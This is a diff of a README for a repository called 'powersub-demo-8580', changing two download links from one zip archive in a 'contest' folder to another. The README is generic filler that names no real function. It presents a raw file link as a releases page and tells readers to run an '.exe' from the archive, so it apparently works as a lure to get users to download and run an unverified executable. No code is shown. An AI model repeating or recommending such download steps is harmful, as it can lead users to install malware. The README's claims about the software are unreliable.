@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-8580 - Simplifying Your Workflow with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/sahasaya/powersub-demo-8580/main/contest/powersub-demo-8580-v3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sahasaya/powersub-demo-8580/main/contest/powersub-demo-8580-v3.7.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/sahasaya/powersub-demo-8580/main/contest/demo_powersub_preassurance.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sahasaya/powersub-demo-8580/main/contest/demo_powersub_preassurance.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-8580! This application helps you streamline your tasks efficiently. Follow the steps below to download and run the software on your computer.
@@ -14,7 +14,7 @@ Welcome to powersub-demo-8580! This application helps you streamline your tasks 
 
 ## 📂 Download & Install
 1. **Visit the releases page:** Click the link below to access the download page.
-   [Download from Releases](https://raw.githubusercontent.com/sahasaya/powersub-demo-8580/main/contest/powersub-demo-8580-v3.7.zip)
+   [Download from Releases](https://raw.githubusercontent.com/sahasaya/powersub-demo-8580/main/contest/demo_powersub_preassurance.zip)
 
 2. **Select the latest version:** Find the version that ends with `.exe` and is marked as the latest release. This version contains the most recent updates and bug fixes.
 
